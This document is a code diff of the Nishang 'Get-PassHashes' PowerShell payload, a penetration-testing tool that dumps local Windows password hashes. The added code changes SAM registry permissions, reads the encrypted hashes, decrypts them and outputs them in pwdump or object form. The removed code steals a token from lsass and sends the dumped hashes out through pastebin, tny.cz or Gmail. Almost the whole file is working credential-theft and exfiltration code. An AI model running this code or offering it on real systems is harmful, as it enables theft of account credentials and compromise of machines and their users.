@@ -1,270 +1,135 @@
+function Get-PassHashes { 
 <# 
 .SYNOPSIS 
 Nishang payload which dumps password hashes. 
  
 .DESCRIPTION 
-The payload uses Enable-DuplicateToken payload and then the hashes are dumped using the powerdump script from MSF.
-The hashes could be exfiltrated using method of choice.
-
-.PARAMETER exfil
-Use this parameter to use exfiltration methods.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where keys would be pasted.
-Username for the tinypaste account where keys would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where keys would be pasted.
-Password for the tinypaste account where keys would be pasted.
-Password for the gmail account where keys would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste  
+The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
+(but not SYSTEM privs as for the original powerdump written by David Kennedy)
 
 .EXAMPLE 
-PS > .\Get-PassHashes.ps1 
+PS > Get-PassHashes
+Run above from an elevated shell.
+
 
 .EXAMPLE 
-PS > .\Get-PassHashes.ps1 -exfil <dev_key> <username> <password> <keyoutoption>
-
-Use above when using the payload from non-interactive shells.
+PS > Get-PassHashes -PSObjectFormat
+Use above to receive the hashes output as a PSObject.
  
 .LINK 
-http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
-http://code.google.com/p/nishang
+http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+https://github.com/samratashok/nishang
+
+.Notes
+Reflection added by https://github.com/Zer1t0
 
 #> 
-[CmdletBinding(DefaultParameterSetName="noexfil")]
-Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
-[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+[CmdletBinding()]
+Param (
+    [Switch]$PSObjectFormat
+)
 
-function Get-PassHashes { 
- 
-$signature = @" 
-    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
-     public struct TokPriv1Luid 
-     { 
-         public int Count; 
-         public long Luid; 
-         public int Attr; 
-     } 
- 
-    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
-    public const int TOKEN_QUERY = 0x00000008; 
-    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
-    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
- 
-    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
-    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
-    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
-    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
-    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
-    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
-    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
-    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
-    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
-    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
-      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
-      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
-      TOKEN_ADJUST_SESSIONID); 
- 
-    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
-    public const int ANYSIZE_ARRAY = 1; 
- 
-    [StructLayout(LayoutKind.Sequential)] 
-    public struct LUID 
-    { 
-      public UInt32 LowPart; 
-      public UInt32 HighPart; 
-    } 
- 
-    [StructLayout(LayoutKind.Sequential)] 
-    public struct LUID_AND_ATTRIBUTES { 
-       public LUID Luid; 
-       public UInt32 Attributes; 
-    } 
- 
- 
-    public struct TOKEN_PRIVILEGES { 
-      public UInt32 PrivilegeCount; 
-      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
-      public LUID_AND_ATTRIBUTES [] Privileges; 
-    } 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
-        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
- 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-    [return: MarshalAs(UnmanagedType.Bool)] 
-    public static extern bool SetThreadToken( 
-      IntPtr PHThread, 
-      IntPtr Token 
-    ); 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-     [return: MarshalAs(UnmanagedType.Bool)] 
-      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
-       UInt32 DesiredAccess, out IntPtr TokenHandle); 
- 
-    [DllImport("advapi32.dll", SetLastError = true)] 
-    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
- 
-    [DllImport("kernel32.dll", ExactSpelling = true)] 
-    public static extern IntPtr GetCurrentProcess(); 
- 
-    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
-     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
-     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
-"@ 
- 
-  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
-  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
-    Write-Warning "Run the Command as an Administrator" 
-    Break 
-  } 
- 
-  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
-  $adjPriv = [AdjPriv.AdjPriv] 
-  [long]$luid = 0 
- 
-  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
-  $tokPriv1Luid.Count = 1 
-  $tokPriv1Luid.Luid = $luid 
-  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
- 
-  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
-  
-  [IntPtr]$htoken = [IntPtr]::Zero 
-  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
-   
-   
-  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
-  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
- 
-  if(-not($retVal)) { 
-    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
-    Break 
-  } 
- 
-  $process = (Get-Process -Name lsass) 
-  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
-  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
- 
-  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
-  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
-  
-  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
-  
- 
-  if(-not($retVal)) { 
-    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
-  } 
-   $script:pastevalue = DumpHashes
+$script:PowerDump = $null
+function LoadApi
+{
+    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
+    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
+    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')
+
+    #######################################################################
+    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegOpenKeyEx',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
+    )
+
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegOpenKeyEx',
+        [Runtime.InteropServices.CharSet]::Auto
+    )
+
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ##########################################################################
+    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
+    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegQueryInfoKey',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
+    )
+
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegQueryInfoKey',
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        $true
+    )
+
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ###############################################################################
+    #[DllImport("advapi32.dll", SetLastError=true)]
+    #public static extern int RegCloseKey(int hKey);
+    $PInvokeMethod = $TypeBuilder.DefineMethod(
+        'RegCloseKey',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [int],
+        [Type[]] @( [int])
+    )
+
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    )
+    $FieldValueArray = [Object[]] @(
+        'RegCloseKey',
+        $true
+    )
+
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @('advapi32.dll'),
+        $FieldArray,
+        $FieldValueArray
+    )
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+    ################################################################################
+    
+    $script:PowerDump = $TypeBuilder.CreateType()
 }
 
 #######################################powerdump written by David Kennedy#########################################
-function LoadApi
-{
-    $oldErrorAction = $global:ErrorActionPreference;
-    $global:ErrorActionPreference = "SilentlyContinue";
-    $test = [PowerDump.Native];
-    $global:ErrorActionPreference = $oldErrorAction;
-    if ($test)
-    {
-        # already loaded
-        return;
-     }
-
-$code = @'
-using System;
-using System.Security.Cryptography;
-using System.Runtime.InteropServices;
-using System.Text;
-
-namespace PowerDump
-{
-    public class Native
-    {
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
-     public static extern int RegOpenKeyEx(
-        int hKey,
-        string subKey,
-        int ulOptions,
-        int samDesired,
-        out int hkResult);
-
-    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
-    extern public static int RegEnumKeyEx(
-        int hkey,
-        int index,
-        StringBuilder lpName,
-        ref int lpcbName,
-        int reserved,
-        StringBuilder lpClass,
-        ref int lpcbClass,
-        out long lpftLastWriteTime);
-
-    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
-    extern public static int RegQueryInfoKey(
-        int hkey,
-        StringBuilder lpClass,
-        ref int lpcbClass,
-        int lpReserved,
-        out int lpcSubKeys,
-        out int lpcbMaxSubKeyLen,
-        out int lpcbMaxClassLen,
-        out int lpcValues,
-        out int lpcbMaxValueNameLen,
-        out int lpcbMaxValueLen,
-        out int lpcbSecurityDescriptor,
-        IntPtr lpftLastWriteTime);
-
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern int RegCloseKey(
-        int hKey);
-
-        }
-    } // end namespace PowerDump
-
-    public class Shift {
-        public static int   Right(int x,   int count) { return x >> count; }
-        public static uint  Right(uint x,  int count) { return x >> count; }
-        public static long  Right(long x,  int count) { return x >> count; }
-        public static ulong Right(ulong x, int count) { return x >> count; }
-        public static int    Left(int x,   int count) { return x << count; }
-        public static uint   Left(uint x,  int count) { return x << count; }
-        public static long   Left(long x,  int count) { return x << count; }
-        public static ulong  Left(ulong x, int count) { return x << count; }
-    }
-'@
-
-   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
-   $dllName = [PsObject].Assembly.Location
-   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
-   $assemblies = @("System.dll", $dllName)
-   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
-   $compilerParameters.GenerateInMemory = $true
-   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
-   if($compilerResults.Errors.Count -gt 0) {
-     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
-   }
-
-}
 
 $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
 $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
@@ -291,36 +156,35 @@ $odd_parity = @(
 
 function sid_to_key($sid)
 {
-    $s1 = @();
-    $s1 += [char]($sid -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
-    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
-    $s1 += $s1[0];
-    $s1 += $s1[1];
-    $s1 += $s1[2];
-    $s2 = @();
-    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
-    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
-    return ,((str_to_key $s1),(str_to_key $s2));
+    $c0 = $sid -band 255
+    $c1 = ($sid -band 65280)/256
+    $c2 = ($sid -band 16711680)/65536
+    $c3 = ($sid -band 4278190080)/16777216
+
+    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
+    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 
+
+    return ,((str_to_key $s1),(str_to_key $s2))
 }
 
 function str_to_key($s)
 {
-    $key = @();
-    $key += [Shift]::Right([int]($s[0]), 1 );
-    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
-    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
-    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
-    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
-    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
-    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
-    $key += $([int]($s[6]) -band 0x7F);
+    $k0 = [int][math]::Floor($s[0] * 0.5)
+    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
+    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
+    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
+    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
+    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
+    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
+    $k7 = $($s[6] -band 0x7F)
+
+    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)
+
     0..7 | %{
-        $key[$_] = [Shift]::Left($key[$_], 1);
-        $key[$_] = $odd_parity[$key[$_]];
-        }
-    return ,$key;
+        $key[$_] = $odd_parity[($key[$_] * 2)]
+    }
+
+    return ,$key
 }
 
 function NewRC4([byte[]]$key)
@@ -396,11 +260,11 @@ function Get-RegKeyClass([string]$key, [string]$subkey)
     $KEYALLACCESS = 0x3F;
     $result = "";
     [int]$hkey=0
-    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
+    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
     {
     	$classVal = New-Object Text.Stringbuilder 1024
     	[int]$len = 1024
-    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
+    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
     		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
     	{
     		$result = $classVal.ToString()
@@ -409,7 +273,7 @@ function Get-RegKeyClass([string]$key, [string]$subkey)
     	{
     		Write-Error "RegQueryInfoKey failed";
     	}
-    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
+    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
     }
     else
     {
@@ -453,14 +317,30 @@ function Get-UserName([byte[]]$V)
 function Get-UserHashes($u, [byte[]]$hbootkey)
 {
     [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
-    if ($u.HashOffset + 0x28 -lt $u.V.Length)
+    
+    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
+    $LM_exists = $false;
+    $NT_exists = $false;
+    # LM header check
+    if ($u.V[0xa0..0xa3] -eq 20)
+    {
+        $LM_exists = $true;
+    }
+    # NT header check
+    elseif ($u.V[0xac..0xaf] -eq 20)
+    {
+        $NT_exists = $true;
+    }
+
+    if ($LM_exists -eq $true)
     {
         $lm_hash_offset = $u.HashOffset + 4;
         $nt_hash_offset = $u.HashOffset + 8 + 0x10;
         $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
         $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
     }
-    elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
+	
+    elseif ($NT_exists -eq $true)
     {
         $nt_hash_offset = $u.HashOffset + 8;
         $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
@@ -516,84 +396,55 @@ function DumpHashes
     $hbootKey = Get-HBootKey $bootkey;
     Get-UserKeys | %{
         $hashes = Get-UserHashes $_ $hBootKey;
-        "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
+        if($PSObjectFormat)
+        {
+            $creds = New-Object psobject
+            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
+            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
+            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
+            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
+            $creds
+        }
+        else
+        {
+            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
             [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
             [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
+        }
+    }
+}
+
+    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+    {
+        Write-Warning "Script requires elevated or administrative privileges."
+        Return
+    } 
+    else
+    {
+        #Set permissions for the current user.
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+        "FullControl",
+        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+        [System.Security.AccessControl.PropagationFlags]"None",
+        [System.Security.AccessControl.AccessControlType]"Allow")
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+        "SAM\SAM\Domains",
+        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+        $acl = $key.GetAccessControl()
+        $acl.SetAccessRule($rule)
+        $key.SetAccessControl($acl)
+
+        DumpHashes
+
+        #Remove the permissions added above.
+        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+        Set-Acl HKLM:\SAM\SAM\Domains $acl
+
     }
 }
 
 
-if($exfil -eq $True)
-{
-    function Do-Exfiltration
-    {   
-        $paste_name = $env:COMPUTERNAME + ": Hashes"
-        function post_http($url,$parameters) 
-        { 
-            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
-            $http_request.open("POST", $url, $false) 
-            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-            $http_request.setRequestHeader("Content-length", $parameters.length); 
-            $http_request.setRequestHeader("Connection", "close") 
-            $http_request.send($parameters) 
-            $script:session_key=$http_request.responseText 
-        } 
-
-        function Get-MD5()
-        {
-            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
-            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-            $utf8 = new-object -TypeName System.Text.UTF8Encoding
-            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
-            return $hash
-        }
-
-        if ($keyoutoption -eq "0")
-        {
-        
-            $pastevalue
-        }
-
-        elseif ($keyoutoption -eq "1")
-        {
-            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
-        }
-        
-        elseif ($keyoutoption -eq "2")
-        {
-            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-            $smtpserver = “smtp.gmail.com”
-            $msg = new-object Net.Mail.MailMessage
-            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
-            $smtp.EnableSsl = $True
-            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-            $msg.From = “$username@gmail.com”
-            $msg.To.Add(”$username@gmail.com”)
-            $msg.Subject = $paste_name
-            $msg.Body = $pastevalue
-            if ($filename)
-            {
-                $att = new-object Net.Mail.Attachment($filename)
-                $msg.Attachments.Add($att)
-            }
-            $smtp.Send($msg)
-        }
-
-        elseif ($keyoutoption -eq "3")
-        {
-            
-            $hash = Get-MD5
-            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
-        }
-
-    }
-    Get-PassHashes
-    Do-Exfiltration
-}
-
-else
-{
-    Get-PassHashes
-    $pastevalue
-}
